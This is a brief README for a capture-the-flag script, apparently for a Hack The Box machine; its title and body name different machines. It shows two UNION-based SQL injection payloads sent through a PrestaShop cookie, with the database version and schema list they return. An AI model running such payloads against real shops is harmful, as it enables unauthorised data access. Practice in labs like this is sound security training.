# HTB Instant

Simple script for `SQL Injection` at `HTB Shared` machine.

## Usage

```shell-session
❯ python3 cookie_editor_Prestashop.py "' union select 1,version(),3-- -"
['3', '10.5.15-MariaDB-0+deb11u1', '1', '$3,00']

❯ python3 cookie_editor_Prestashop.py "' union select 1,(SELECT GROUP_CONCAT(CONCAT(schema_name, 0x3a)) FROM information_schema.schemata),3-- -"
['3', 'information_schema:,checkout:', '1', '$3,00']
```
